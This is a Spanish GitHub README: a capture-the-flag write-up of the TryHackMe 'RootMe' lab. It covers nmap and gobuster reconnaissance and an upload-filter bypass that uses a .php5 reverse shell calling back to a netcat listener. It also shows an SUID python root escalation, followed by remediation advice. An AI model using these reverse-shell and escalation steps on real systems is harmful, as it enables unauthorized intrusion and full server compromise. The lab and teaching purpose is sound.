# README

# Informe y Guía de Estudio: Desafío "RootMe" (TryHackMe)

**Autor:** FirestoneuniCL (Github)

**Entorno:** TryHackMe – Room: [RootMe](https://tryhackme.com/room/rrootme)

**Fecha:**  25 de Octubre de 2026

---

## 1. Objetivo y Descripción del Laboratorio

El presente  informe técnico trata sobre el procedimiento realizado en el desafío de la máquina **"RootMe"** en el entorno controlado de **TryHackMe**, haciendo uso de una máquina virtual propia con Kali Linux y haciendo conexión via VPN, a través de las instrucciones mencionadas en la misma página oficial, además, proposiciones para la prevención de estos ataques.

El objetivo consistió en ejecutar un test de penetración de caja negra (*Black-Box*) sobre el servidor objetivo (la ip asignada para este desafío fue `10.65.147.166`), abarcando desde la configuración del entorno virtualizado propio y el reconocimiento activo de red, hasta la explotación de una vulnerabilidad de subida de archivos (*Unrestricted File Upload*) y la posterior escalada de privilegios local mediante binarios con permisos **SUID**, proponiendo finalmente medidas concretas de remediación (*hardening*).

Cabe señalar, que para cumplir con buenas prácticas de seguridad y las reglas del desafío por respeto al autor, las *flags* (`user.txt` y `root.txt`) han sido parcialmente truncadas (`[REDACTED]`) en este repositorio público, acreditando su obtención mediante capturas del proceso y validación de privilegios (`whoami` / `id`).

---

## 2. Herramientas Utilizadas

| Herramienta | Propósito en la Auditoría |
| --- | --- |
| **VirtualBox + Kali Linux VM** | Entorno virtualizado propio configurado como estación de ataque independiente de la AttackBox web. |
| **OpenVPN** | Cliente VPN para establecer el túnel cifrado (`tun0`) entre la VM Kali Linux y la red privada de TryHackMe. |
| **Nmap** | Escaneo activo de puertos TCP, detección de servicios y *fingerprinting* de versiones. |
| **Gobuster** | Fuerza bruta web (*directory fuzzing*) para descubrir directorios y archivos ocultos no enlazados. |
| **PHP Reverse Shell** | Payload en PHP (`pentestmonkey`) para abrir una consola remota inversa desde el servidor hacia Kali. |
| **Netcat (`nc`)** | Utilidad de red empleada como receptor (*listener*) TCP para capturar la conexión de la *reverse shell*. |
| **Find & Python (`pty` / `os`)** | Búsqueda de binarios con bit SUID en el sistema operativo, estabilización de terminal TTY y escalada a `root`. |

---

## 3. Metodología, Análisis de Comandos y Explotación Paso a Paso

### Etapa 0: Preparación del Entorno Propio (Kali Linux VM + OpenVPN)

Por iniciativa propia, en lugar de depender de la *AttackBox* temporal del navegador, se desplegó una **máquina virtual con Kali Linux** y se conectó directamente a la red del laboratorio mediante un archivo de configuración `.ovpn`:

```bash
sudo openvpn archivo.ovpn
```

En una segunda terminal, se verificó la creación de la interfaz de túnel virtual (`tun0`) para conocer nuestra IP de atacante dentro de la VPN:

```bash
ip -4 a show tun0
```

**Desglose del comando (Material de Estudio):**

| Elemento / Flag | Qué hace y para qué sirve |
| --- | --- |
| `sudo` | Ejecuta el comando con privilegios de superusuario (necesario porque OpenVPN debe crear una tarjeta de red virtual en el sistema). |
| `openvpn <archivo.ovpn>` | Inicia el cliente OpenVPN leyendo los certificados y rutas de red contenidos en el archivo descargado de TryHackMe. |
| `ip -4 a show tun0` | Muestra únicamente la dirección IPv4 (`-4`) asignada a la interfaz de túnel VPN (`tun0`). En este laboratorio nos asignó la IP **`192.168.131.47`**. |

---

### Etapa 1: Reconocimiento Activo y Escaneo de Puertos (Nmap)

Con conectividad hacia la máquina víctima (`10.65.147.166`), el primer paso fue identificar qué puertas (puertos TCP) están abiertas y qué programas escuchan detrás de ellas:

```bash
nmap -sC -sV -Pn 10.65.147.166 -oN nmap_rootme.txt
```

**Explicación de cada flag (para usar en cualquier auditoría):**

| Flag | Qué hace |
| --- | --- |
| `-sC` | Ejecuta los **scripts por defecto** de Nmap (NSE). Sirve para detectar configuraciones comunes, cabeceras HTTP, títulos de páginas y detalles de cookies automáticamente. |
| `-sV` | Activa la detección de **versiones** (*Service Version*). En vez de decir solo "puerto 80 http", interroga al puerto para saber la versión exacta (ej. `Apache httpd 2.4.41`). |
| `-Pn` | **No Ping** (*Skip Host Discovery*). Le ordena a Nmap no hacer una prueba de ping previa y asumir que la máquina está encendida. Es fundamental en VPNs o frente a firewalls que bloquean el ping (ICMP). |
| `-p-` *(Opcional)* | Si se agrega `-p-`, escanea **todos** los 65.535 puertos TCP y no solo los 1.000 más comunes. Tarda más, pero evita pasar por alto servicios en puertos altos no estándar. |
| `-oN nmap_rootme.txt` | **Output Normal**: Guarda toda la salida de la terminal en un archivo de texto plano (`nmap_rootme.txt`) para conservarlo como evidencia del informe. |

**Hallazgos del escaneo:**

- **`22/tcp` OPEN (SSH):** `OpenSSH 8.2p1 Ubuntu` (Acceso remoto seguro; requiere credenciales que aún no se tienen).
- **`80/tcp` OPEN (HTTP):** `Apache httpd 2.4.41 (Ubuntu)`. Este servidor web fue el punto de entrada.

![Etapa 2: Enumeración Web y Descubrimiento de Directorios Ocultos (Gobuster)](README/Captura_1_cleaned.png)

Etapa 2: Enumeración Web y Descubrimiento de Directorios Ocultos (Gobuster)

---

Al abrir `http://10.65.147.166/` en el navegador de Kali, solo se observa un cartel estático (`Can you root me?`) sin botones, menús ni enlaces en su código fuente HTML. Sin embargo, en un servidor web pueden existir carpetas reales que simplemente **no están enlazadas desde la página principal**.

Para descubrirlas, se aplicó **Fuzzing de Directorios (*Directory Busting*)** con **Gobuster**:

```bash
gobuster dir -u http://10.65.147.166 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -o gobuster_rootme.txt
```

**Explicación de cada flag:**

| Flag | Qué hace |
| --- | --- |
| `dir` | Activa el modo de búsqueda de **directorios y archivos** (Gobuster tiene otros modos como `dns` para subdominios o `vhost`). |
| `-u <http://10.65.147.166`> | Define la **URL objetivo** que se va a auditar. |
| `-w .../common.txt` | **Wordlist (Diccionario):** Archivo de texto con 4.614 nombres comunes (`admin`, `panel`, `uploads`, `login`) que Gobuster probará uno por uno en la URL. |
| `-x php,txt,html` | **Extensiones:** Además de probar cada palabra como carpeta (`/panel`), prueba agregándole esas extensiones (`/index.php`, `/robots.txt`). Clave en servidores que usan PHP. |
| `-o gobuster_rootme.txt` | Guarda todos los hallazgos en un archivo de texto como respaldo de evidencia. |

**Cómo interpretar los códigos HTTP que encontró Gobuster:**

- `/index.php` (**Status: 200 OK**): La página principal existe y responde normalmente.
- `/css`, `/js`, `/panel`, `/uploads` (**Status: 301 Moved Permanently**): El código `301` indica que son **directorios reales** en el servidor. Al descubrir **`/panel/`** (un formulario de subida oculto) y **`/uploads/`** (la carpeta donde se guardan los archivos subidos), se encuentra el vector de ataque.
- `/.htaccess`, `/server-status` (**Status: 403 Forbidden**): Existen en el servidor, pero Apache deniega la lectura.

![Reconocimiento Nmap y Gobuster](README/Captura_2_cleaned.png)

---

### Etapa 3: Pruebas de Carga, Evasión de Filtro (Bypass) y Reverse Shell

#### 3.1. Prueba de Concepto Inofensiva (PoC)

Antes de subir un *exploit*, para probar cómo funciona el formulario en `http://10.65.147.166/panel/`, se creó un archivo de texto de prueba:

```bash
echo 'test' > prueba.txt
```

- `echo 'test'`: Genera la cadena de texto `test`.
- `> prueba.txt`: El símbolo `>` redirige esa salida y la guarda dentro de un archivo nuevo llamado `prueba.txt`.

Al subir `prueba.txt` en `/panel/`, el servidor respondió *"O arquivo foi upado com sucesso!"* (traducido al español significa “¡El archivo se subió correctamente!”) y se puede ver dicho archivo, publicado dentro de `http://10.65.147.166/uploads/`.

![Captura_3_cleaned.png](README/Captura_3_cleaned.png)

![Captura_6_cleaned.png](README/Captura_6_cleaned.png)

![Captura_7_cleaned.png](README/Captura_7_cleaned.png)

![Captura_8_cleaned.png](README/Captura_8_cleaned.png)

![Captura_9_cleaned.png](README/Captura_9_cleaned.png)

#### 3.2. Qué pasa al subir un archivo `.php` y cómo hacer el Bypass

La diferencia entre un servidor mal configurado y uno explotable es lograr que **ejecute código nuestro**. Como el sitio usa PHP, se intentó subir una *Reverse Shell* con extensión `.php`, pero el formulario la bloquea (*"Archivo no permitido"*).

Esto ocurre porque el programador implementó una **lista negra (*blacklist*)** que prohíbe `.php`. Sin embargo, Apache puede interpretar extensiones alternativas de PHP como **`.php5`** o **`.phtml`**. Entonces, se procedió a copiar la *reverse shell* preinstalada en Kali cambiándole la extensión a `.php5`:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php5
nano shell.php5
```

**Explicación de los comandos y variables configuradas:**

| Comando / Variable | Qué hace |
| --- | --- |
| `cp <origen> shell.php5` | Copia la plantilla de *reverse shell* de PentestMonkey a la carpeta actual renombrándola con extensión `.php5` para evadir el filtro web. |
| `nano shell.php5` | Abre el editor de texto en terminal para modificar la IP y el puerto a donde el servidor víctima debe conectarse. |
| `$ip = '192.168.131.47';` | **Dirección IP de la VM Kali en la VPN (`tun0`)**. Le indica al servidor víctima a qué dirección IP debe enviar la consola remota. |
| `$port = 1234;` | **Puerto TCP local** donde la máquina Kali estará esperando la llamada. |

![Captura_10_cleaned.png](README/Captura_10_cleaned.png)

![Captura_11_cleaned.png](README/Captura_11_cleaned.png)

#### 3.3. Recepción de la Reverse Shell con Netcat

Se sube el archivo `shell.php5` en `/panel/` (el servidor lo acepta sin bloquearlo). Y antes de abrirlo en `/uploads/`, se coloca a la máquina Kali, a escuchar en el puerto `1234`:

```bash
nc -lvnp 1234
```

**Explicación de cada flag de Netcat (`nc`):**

| Flag | Qué hace |
| --- | --- |
| `-l` | **Listen (Escuchar):** Pone a Netcat en modo servidor, esperando recibir una conexión entrante. |
| `-v` | **Verbose (Detallado):** Muestra en pantalla cuando alguien se conecta exitosamente (`connect to [192.168.131.47] from ...`). |
| `-n` | **Numeric-only:** Usa direcciones IP numéricas directamente sin perder tiempo resolviendo nombres DNS. |
| `-p 1234` | **Port:** Define el puerto exacto (`1234`) en el que se está escuchando. |

Al hacer clic sobre `shell.php5` dentro de `http://10.65.147.166/uploads/`, el servidor ejecuta el script PHP y la terminal de Netcat recibe el control remoto del servidor bajo el usuario `www-data`.

![Captura_12_cleaned.png](README/Captura_12_cleaned.png)

---

### Etapa 4: Estabilización de Consola (TTY) y Captura de `user.txt`

La consola inicial que entrega Netcat es muy limitada (no permite usar flechas del teclado ni autocompletar, y si se llega a presionar `Ctrl + C` se cierra toda la conexión). Para esto, se ejecutaron los siguientes comandos para estabilizarla y buscar la primera bandera:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
find / -type f -name user.txt 2>/dev/null
whoami && id
head -c 9 /var/www/user.txt; echo "...[REDACTED]"
```

**Explicación línea por línea:**

| Comando / Parte | Qué hace |
| --- | --- |
| `python -c '...'` | Ejecuta una instrucción de Python directamente desde la terminal sin crear un archivo. |
| `import pty; pty.spawn("/bin/bash")` | Usa la librería nativa *pseudo-terminal* (`pty`) de Python para transformar nuestra conexión básica en una consola `/bin/bash` interactiva real (`bash-5.0$`). |
| `export TERM=xterm` | Configura la variable de entorno visual para poder usar atajos y limpiar la pantalla con `clear`. |
| `find / -type f -name user.txt` | Busca desde la raíz de todo el disco duro (`/`) únicamente archivos (`-type f`) que se llamen exactamente `user.txt`. |
| `2>/dev/null` | **Redirección de errores:** En Linux, el canal `2` representa los errores (*stderr*). Como se es un usuario con pocos permisos (`www-data`), muchas carpetas darían error *"Permission denied"*. Enviar `2>` a `/dev/null` oculta toda esa basura y deja limpia la ruta encontrada: **`/var/www/user.txt`**. |
| `whoami && id` | Muestra nuestro nombre de usuario actual (`www-data`) y su identificador de permisos (`uid=33`). |
| `head -c 9 /var/www/user.txt` | Imprime solo los primeros 9 caracteres del archivo (`THM{y...[REDACTED]`) para demostrar la captura en el informe sin exponer la *flag* completa en GitHub. |

![Evidencia de acceso www-data y user.txt](README/Captura_13_cleaned.png)

---

### Etapa 5: Escalada de Privilegios a `root` (Abuso de Permisos SUID)

El usuario `www-data` solo tiene permisos para manejar páginas web y no puede entrar a la carpeta `/root`. Para convertirse en administrador absoluto (`root`), se deben buscar los archivos en el sistema que tengan activo el **bit SUID**:

```bash
find / -user root -perm /4000 2>/dev/null
```

**Explicación del comando y qué es el bit SUID:**

| Elemento / Flag | Qué hace y por qué es crítico |
| --- | --- |
| **¿Qué es SUID?** | *Set Owner User ID up on execution*. Es un permiso especial de Linux que hace que un programa se ejecute **con los permisos del dueño del archivo** (en este caso `root`), sin importar qué usuario lo abra. |
| `-user root` | Filtra la búsqueda para mostrar solo archivos cuyo propietario sea el administrador `root`. |
| `-perm /4000` | El número `4000` es el valor octal del permiso SUID en Linux. Busca todos los archivos que tengan ese permiso especial activado. |

En la lista devuelta por `find`, aparece un binario que jamás debería tener permiso SUID: **`/usr/bin/python2.7`** (`/usr/bin/python`).

![Enumeración de binarios SUID](README/Captura_14_cleaned.png)

Como Python tiene el permiso SUID de `root`, cualquier comando que se le pida ejecutar a Python, lo hará con nivel de superusuario. Consultando la base de datos [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid), se ejecuta el siguiente *exploit*:

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami && id
head -c 9 /root/root.txt; echo "...[REDACTED]"
```

**Explicación del exploit de escalada de privilegios:**

| Parte del comando | Qué hace |
| --- | --- |
| `/usr/bin/python -c` | Llama al binario de Python que tiene el permiso SUID propiedad de `root`. |
| `import os; os.execl(...)` | Importa el módulo de sistema operativo (`os`) de Python y reemplaza el proceso actual por un nuevo programa. |
| `"/bin/sh", "sh", "-p"` | Abre una consola de comandos (`/bin/sh`) pasándole la flag **`-p`** (*privileged*). Sin `-p`, la consola soltaría los permisos de `root` por seguridad; con `-p`, **mantiene el `euid=0(root)`**. |

Al ejecutar `whoami && id`, el sistema confirma que uno es **`root`** (`euid=0(root)`), logrando leer la bandera final en `/root/root.txt` (`THM{p[REDACTED]`) y completando el laboratorio.

![Escalada de privilegios a root y root.txt](README/Captura_15_cleaned.png)

---

## 4. Vulnerabilidades Identificadas y su Impacto en un Entorno Real

| # | Vulnerabilidad | Clasificación | Cómo se detectó | Condiciones que permitieron explotarla | Impacto en un entorno real |
| --- | --- | --- | --- | --- | --- |
| **1** | **Subida de Archivos sin Restricción (Unrestricted File Upload)** | CWE-434 / OWASP A03:2021 | Probando extensiones en `/panel/` (rechazó `.php`, pero aceptó `.php5`). | Filtro basado en *blacklist* incompleta (solo bloqueaba `.php`), sin verificar el tipo MIME real, y con ejecución de scripts activa en `/uploads/`. | **Ejecución Remota de Código (RCE):** Toma de control del servidor web, robo de bases de datos, alteración del sitio o pivoteo hacia la red interna de la empresa. |
| **2** | **Rutas Administrativas sin Autenticación y Directory Listing** | CWE-284 / CWE-548 (OWASP A01:2021) | Fuzzing de directorios con Gobuster (`/panel`, `/uploads`, `/css`, `/js`). | Confiar en que "ocultar" el enlace basta para proteger `/panel/` (*Security through Obscurity*) y dejar `Options Indexes` activo en Apache. | Cualquier persona en Internet puede descubrir el panel con un escáner, subir archivos maliciosos y listar todos los documentos subidos por otros usuarios. |
| **3** | **Bit SUID Asignado a un Intérprete (`/usr/bin/python2.7`)** | CWE-250 / CWE-269 | Enumeración local con `find / -user root -perm /4000 2>/dev/null`. | Un administrador otorgó permisos SUID (`chmod u+s`) al binario de Python propiedad de `root`. | **Compromiso Total (Root):** Cualquier atacante que logre entrar con un usuario básico (`www-data`) se convierte en dueño absoluto del servidor en un solo comando. |
| **4** | **Exposición de Versión del Servidor Web (Banner Grabbing)** | CWE-200 | Escaneo `nmap -sV` y pie de página en `/uploads/` (`Apache/2.4.41 Ubuntu`). | Configuración por defecto de Apache (`ServerTokens Full` y `ServerSignature On`). | Facilita a los atacantes buscar vulnerabilidades públicas (CVEs) exactas para esa versión de Apache y Ubuntu. |

---

## 5. Propuesta de Remediaciones (Hardening)

Para corregir de raíz cada debilidad encontrada y aplicar el **principio de mínimo privilegio**:

### 5.1. Remediación de la Subida de Archivos y Servidor Apache

1. **Validación por Lista Blanca (*Whitelist*) y Verificación de Contenido:**
    - En lugar de bloquear extensiones peligrosas (*blacklist*); programar el formulario en `/panel/` para que **solo acepte una lista blanca de formatos seguros** (ej. `.jpg`, `.png`, `.pdf`), comprobando además los *Magic Bytes* reales del archivo con `finfo_file()` en PHP y renombrándolo con un identificador aleatorio (UUID).
2. **Deshabilitar la Ejecución de Código y el Listado en `/uploads/`:**
    - Configurar Apache (`/etc/apache2/sites-available/000-default.conf`) para que la carpeta `/uploads/` jamás ejecute scripts PHP ni muestre la lista de archivos:
        
        ```
        <Directory "/var/www/html/uploads">
            Options -Indexes -ExecCGI
            AllowOverride None
            php_admin_flag engine off
            <FilesMatch "\.(php|php[0-9]|phtml|pl|py|sh|cgi)$">
                Require all denied
            </FilesMatch>
        </Directory>
        ```
        
3. **Autenticación Obligatoria en `/panel/`:**
    - Exigir inicio de sesión con credenciales robustas antes de cargar `/panel/` y restringir su acceso por firewall únicamente a IPs de administración.

### 5.2. Remediación de la Escalada de Privilegios (Mínimo Privilegio)

1. **Quitar el Permiso SUID a Python inmediatamente:**
    - Ejecutar en el servidor el siguiente comando para retirar el bit SUID del intérprete:
        
        ```bash
        sudo chmod u-s /usr/bin/python2.7
        ```
        
2. **Auditoría Periódica de Permisos SUID:**
    - Revisar regularmente con `find / -perm /4000` que ningún lenguaje interpretado (`python`, `perl`, `php`, `bash`) ni editor de texto tenga permisos SUID asignados.

### 5.3. Ocultamiento de Versión y Actualización

1. **Endurecimiento de Cabeceras en Apache (`/etc/apache2/conf-available/security.conf`):**
    
    ```
    ServerTokens Prod
    ServerSignature Off
    ```
    
2. **Actualización de Paquetes:** Ejecutar `sudo apt update && sudo apt upgrade -y` y migrar dependencias de Python 2.7 (fuera de soporte) hacia Python 3.

---

## 6. Conclusiones y Aprendizajes Obtenidos

Más allá de obtener las banderas del desafío, el desarrollo de este laboratorio permitió aprender sobre cómo funciona realmente una intrusión y cómo es de importante defender un servidor de un ataque en la vida real:

1. **Comprender la lógica detrás de cada comando en lugar de solo ejecutarlos:** Uno de los mayores aprendizajes de esta actividad fue desglosar qué hace exactamente cada parámetro en la terminal (como el uso de `Pn` y `sV` en Nmap, el filtrado de errores con `2>/dev/null` en Linux o el parámetro `p` al invocar `/bin/sh` desde Python). Entender el propósito de cada instrucción transforma una guía mecánica en conocimiento reutilizable para cualquier auditoría futura.
2. **Valor de configurar un entorno de auditoría propio (VM Kali Linux + OpenVPN):** Tomar la iniciativa de desplegar una máquina virtual propia con Kali Linux y conectarla mediante OpenVPN, en lugar de limitarse a la consola web preconfigurada de la plataforma, permitió entender en la práctica cómo operan las interfaces de túnel (`tun0`) y cómo se direcciona una conexión inversa (*reverse shell*) a través de una red privada.
3. **Ocultar no equivale a proteger (*Security through Obscurity*):** El hallazgo de `/panel/` y `/uploads/` mediante fuerza bruta con *Gobuster* demostró que dejar carpetas sin enlaces visibles en la página principal no ofrece ninguna seguridad real. Asimismo, comprobar que un filtro bloqueaba archivos `.php` pero permitía ejecutar `.php5` dejó en evidencia por qué las listas negras (*blacklists*) suelen fallar frente a listas blancas estrictas.
4. **El impacto real de un permiso mal asignado (SUID) y la higiene al publicar evidencias:** Pasar de un usuario restringido (`www-data`) a administrador total (`root`) con una sola línea de comando demostró el peligro crítico de asignar permisos SUID a intérpretes como Python. 
5. Finalmente, la preparación de este repositorio público utilizó (`[REDACTED]`)  para evitar las respuestas antes de su publicación en respeto al autor del desafío.